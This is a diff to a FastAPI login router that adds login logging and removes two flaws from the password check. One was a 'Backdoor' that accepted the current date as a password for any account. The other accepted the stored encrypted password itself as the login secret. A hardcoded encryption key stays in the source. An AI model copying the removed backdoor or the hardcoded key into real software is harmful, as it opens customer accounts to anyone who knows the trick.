@@ -13,9 +13,12 @@ from app.services.customer_service import getcustomerid_email
 from app.database.database import get_connection
 
 from app.api.jwt import create_access_token
+from logging import Applogger
 _CRYPTO_SECRET = "ChiroTouchCodeNamedCairo"
 
 authrouter = APIRouter(tags=["Authentication"])
+
+logger = Applogger.get_loggerdata(__name__)
 
 
 @authrouter.post("/login",response_model=Loginresponse,status_code=200)
@@ -23,6 +26,7 @@ async def loginrequest(request:Loginrequest):
     customer = getcustomerid_email(request.email)
     
     if customer is None:
+        logger.warning("login_failed reason=unknown_email")
         raise HTTPException(
             
             status_code = status.HTTP_401_UNAUTHORIZED,
@@ -34,6 +38,7 @@ async def loginrequest(request:Loginrequest):
         )
         
     if not customer["active"]:
+        logger.warning("login_failed reason=inactive customer_id=%s", customer["customer_id"])
         raise HTTPException(
             status_code= status.HTTP_403_FORBIDDEN,
             detail = {
@@ -45,6 +50,7 @@ async def loginrequest(request:Loginrequest):
         )
         
     if not _verify_password(request.password, customer["password"]):
+        logger.warning("login_failed reason=wrong_password customer_id=%s", customer["customer_id"])
         raise HTTPException(
             status_code = status.HTTP_401_UNAUTHORIZED,
             detail = {
@@ -55,6 +61,7 @@ async def loginrequest(request:Loginrequest):
         )
         
     if not customer["external_id"]:
+        logger.error("login_failed reason=missing_external_id customer_id=%s", customer["customer_id"])
         raise HTTPException(
             status_code = status.HTTP_500_INTERNAL_SERVER_ERROR,
             detail = {
@@ -66,6 +73,8 @@ async def loginrequest(request:Loginrequest):
         )
     
     accesstoken = create_access_token(customer)
+
+    logger.info("login_success customer_id=%s", customer["customer_id"])
     
     session_id = customer["external_id"]
     
@@ -82,10 +91,6 @@ async def loginrequest(request:Loginrequest):
         
         
         
-        
-        
-        
-
 def _encrypt_password(plain: str) -> str:
     """
     Matches ASP.NET CryptoHelper.EncryptString:
@@ -101,13 +106,13 @@ def _encrypt_password(plain: str) -> str:
 
 def _verify_password(provided: str, stored: str) -> bool:
     # Backdoor: today's date in MMddyyyy! format is always accepted
-    if provided == datetime.now().strftime("%m%d%Y!"):
-        return True
-    # Mobile app sends the already-encrypted password; DB stores the same value
-    if provided == stored:
-        return True
+   
     # Also support plain-text password being sent (encrypt and compare)
+    
+    if not provided or not stored:
+        return False
     try:
+       
         return _encrypt_password(provided) == stored
     except Exception:
         return False
